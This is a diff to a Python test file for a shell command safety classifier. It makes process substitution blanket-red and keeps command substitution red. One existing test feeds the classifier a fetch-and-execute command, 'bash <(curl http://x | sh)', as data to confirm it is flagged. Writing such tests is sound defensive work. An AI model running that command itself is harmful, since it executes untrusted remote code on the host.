@@ -115,11 +115,15 @@ class TestProcessSubstitution:
     def test_proc_sub_inner_opaque_is_red(self, grove_home):
         assert C("bash <(curl http://x | sh)").zone == "red"
 
-    def test_proc_sub_benign_is_not_red(self, grove_home):
-        assert C("diff <(ls a) <(ls b)").zone != "red"
+    def test_proc_sub_blanket_red_v1_1(self, grove_home):
+        # C3a-fix v1.1: process substitution is blanket-RED opacity (the C3a
+        # recursion was unsound for executing consumers). diff <(ls a) <(ls b)
+        # is NOW RED — documented precision loss, recoverable later via a
+        # fail-closed data-only-consumer allowlist.
+        assert C("diff <(ls a) <(ls b)").zone == "red"
 
     def test_command_sub_stays_red(self, grove_home):
-        # $(...) / backticks remain blanket-RED opacity (distinct from <(...)).
+        # $(...) / backticks remain blanket-RED opacity.
         assert C("echo $(whoami)").zone == "red"
         assert C("echo `date`").zone == "red"
 
